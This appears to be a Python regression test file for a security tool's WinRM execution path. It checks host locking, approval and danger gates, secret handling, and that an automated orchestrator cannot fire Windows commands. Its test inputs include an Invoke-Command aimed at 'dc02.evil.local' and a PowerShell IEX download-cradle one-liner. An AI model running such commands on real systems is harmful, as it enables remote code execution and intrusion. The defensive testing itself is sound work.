"""WinRM transport SAFETY invariants — the regression lock for the Windows execution path.

The WinRM driver is a NEW EXECUTION TRANSPORT behind the SAME gates. These tests FAIL LOUDLY
if any of that discipline is weakened:

  1. LOCKED TO THE PROFILE HOST. A Windows run reaches only the host of the saved profile it
     names — resolved server-side from ``windows_profile_id``. There is NO host field on the
     request, so a command can never be pointed at a box the operator did not pick. (What the
     PowerShell command itself does on that box is the operator's approved choice — the same
     caveat the docker argv-lock carries; approval is the real bound.)
  2. NO GATE BYPASS. Unapproved → refused (approval). Dangerous without the ack → refused
     (danger). Unknown profile → refused (windows). The gate re-check holds even on the
     prevalidated path (never-auto-run is the sole floor on a real box).
  3. SECRETS NEVER LEAK. The password / NT hash is never in a public profile view, a run
     record, a start event, or a command line — only the transport sees it.
  4. THE ORCHESTRATOR CANNOT AUTO-RUN WINRM. The transport (winrm_transport) is reachable
     only from the gated executor (+ the human-initiated router probe) — never from any
     proposer/loop/agent module. Scanned across the source tree. The orchestrator may PROPOSE
     a WinRM command; it can never fire one.

Hermetic: temp DB, faked transport + persistence. Run:  python test_winrm_safety.py
"""

from __future__ import annotations

import tempfile
from pathlib import Path

from cockpit import executor, winprofiles, winrm_transport
from cockpit.models import ExecRequest


class _Env:
    def __init__(self, *, result=None):
        self._tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
        self._db_orig = winprofiles.DB_PATH
        self.db = Path(self._tmp.name) / "sessions.db"
        self.result = result or winrm_transport.WinRMResult(0, "ok\n", "")
        self.calls: list[tuple[dict, str, int]] = []
        self.saved: list = []
        self._orig = {}

    def __enter__(self):
        winprofiles.DB_PATH = self.db
        winprofiles.init_db()

        def fake_run(profile, command, timeout):
            self.calls.append((profile, command, timeout))
            return self.result

        self._orig = {
            "transport": winrm_transport.run,
            "save": executor.runstore.save_run,
            "ingest": executor.state_ingest.ingest_run,
        }
        winrm_transport.run = fake_run
        executor.winrm_transport.run = fake_run
        executor.runstore.save_run = lambda rec: self.saved.append(rec)
        executor.state_ingest.ingest_run = lambda **kw: {}
        return self

    def __exit__(self, *exc):
        winrm_transport.run = self._orig["transport"]
        executor.winrm_transport.run = self._orig["transport"]
        executor.runstore.save_run = self._orig["save"]
        executor.state_ingest.ingest_run = self._orig["ingest"]
        winprofiles.DB_PATH = self._db_orig
        self._tmp.cleanup()
        return False


def test_run_is_locked_to_the_profile_host() -> None:
    """No request field can redirect a Windows run off the profile's host. Even a command
    that names another box connects over WinRM to the PROFILE host, and the record says so."""
    with _Env() as env:
        p = winprofiles.create_profile("DC01", "10.0.0.5", "administrator", secret="pw")
        hostile = ExecRequest(
            command="Invoke-Command",
            args=["-ComputerName", "dc02.evil.local", "-ScriptBlock", "{whoami}"],
            windows_profile_id=p["profile_id"],
            approved=True,
        )
        list(executor.iter_run(hostile, prevalidated=True))
        profile, _cmd, _t = env.calls[0]
        assert profile["host"] == "10.0.0.5", "the WinRM session must target the PROFILE host"
        assert env.saved[0].target == "10.0.0.5", "the record must name the profile host"

    # The request model carries NO host/credential field — only the profile id.
    fields = set(ExecRequest.model_fields.keys())
    for forbidden in ("host", "winrm_host", "password", "ntlm_hash", "secret", "creds"):
        assert forbidden not in fields, (
            f"ExecRequest must not expose {forbidden!r} — a Windows run is host-locked to its "
            "saved profile, resolved server-side"
        )
    print("  windows run is locked to the profile host (no host field on the request): PASS")


def test_no_gate_bypass() -> None:
    """Unapproved / dangerous-without-ack / unknown-profile are all refused, nothing runs."""
    with _Env() as env:
        p = winprofiles.create_profile("DC01", "10.0.0.5", "administrator", secret="pw")

        unapproved = ExecRequest(command="whoami", windows_profile_id=p["profile_id"])
        rej = executor.validate_request(unapproved)
        assert rej is not None and rej.gate == "approval", rej
        # Even on the prevalidated path (belt-and-suspenders), an unapproved run is refused.
        evs = list(executor.iter_run(unapproved, prevalidated=True))
        assert evs and evs[0]["type"] == "rejected" and evs[0]["gate"] == "approval"
        assert not env.calls, "an unapproved windows run must never reach the transport"

        # A dangerous command (PowerShell interpreter) needs the explicit second confirm.
        dangerous = ExecRequest(
            command="powershell", args=["-c", "IEX(New-Object Net.WebClient).downloadString('x')"],
            windows_profile_id=p["profile_id"], approved=True,
        )
        rej = executor.validate_request(dangerous)
        assert rej is not None and rej.gate == "danger", rej
        # With the ack it passes the gate.
        dangerous_ok = dangerous.model_copy(update={"dangerous_ack": True})
        assert executor.validate_request(dangerous_ok) is None

        # Unknown profile.
        unknown = ExecRequest(command="whoami", windows_profile_id="win-nope", approved=True)
        rej = executor.validate_request(unknown)
        assert rej is not None and rej.gate == "windows", rej
    print("  no gate bypass (approval / danger / unknown-profile all refuse): PASS")


def test_secret_never_leaks() -> None:
    """The stored secret appears in NO public view, run record, event, or command line."""
    secret = "Sup3rSecretHash!"
    with _Env() as env:
        p = winprofiles.create_profile(
            "DC01", "10.0.0.5", "administrator", secret=secret, domain="corp.local"
        )
        # Public views.
        assert "secret" not in p and secret not in str(p)
        assert secret not in str(winprofiles.list_profiles())
        assert secret not in str(winprofiles.get_public(p["profile_id"]))

        req = ExecRequest(command="whoami", windows_profile_id=p["profile_id"], approved=True)
        events = list(executor.iter_run(req, prevalidated=True))
        assert secret not in str(events), "the secret must never appear in a run's events"
        rec = env.saved[0]
        blob = " ".join([rec.command, *rec.args, rec.stdout, rec.stderr, rec.target])
        assert secret not in blob, "the secret must never appear in the run record"

        # Only the transport (and get_secret, its accessor) ever see the raw secret.
        profile, _cmd, _t = env.calls[0]
        assert profile["secret"] == secret
        assert winprofiles.get_secret(p["profile_id"]) == secret
    print("  secret never leaks (public views / record / events clean): PASS")


def test_transport_not_reachable_from_orchestrator() -> None:
    """winrm_transport is reachable ONLY from the gated executor + the human router probe —
    never from a proposer/loop/agent module. A transport wired to the autonomous path would be
    autonomous execution on a real Windows box."""
    backend = Path(__file__).parent
    allowed = {"executor.py", "winrm_transport.py", "router.py"}
    py_files = list(backend.glob("*.py")) + list((backend / "cockpit").glob("*.py")) \
        + list((backend / "adgraph").glob("*.py"))
    offenders = []
    for f in py_files:
        if f.name in allowed or f.name.startswith("test_"):
            continue
        text = f.read_text(encoding="utf-8")
        if "winrm_transport" in text or "from .winrm_transport" in text:
            offenders.append(str(f.relative_to(backend)))
    assert not offenders, (
        f"the WinRM transport must be reachable only from the gated executor + router — these "
        f"modules reference it: {offenders}. The orchestrator PROPOSES; it must never fire WinRM."
    )
    # The AD orchestrator specifically must not import the transport.
    from adgraph import orchestrator as adorch
    assert not hasattr(adorch, "winrm_transport"), (
        "the AD orchestrator must have no handle on the WinRM transport"
    )
    print("  winrm transport is not reachable from any proposer/loop/agent module: PASS")


if __name__ == "__main__":
    test_run_is_locked_to_the_profile_host()
    test_no_gate_bypass()
    test_secret_never_leaks()
    test_transport_not_reachable_from_orchestrator()
    print("ALL WinRM safety invariants hold")
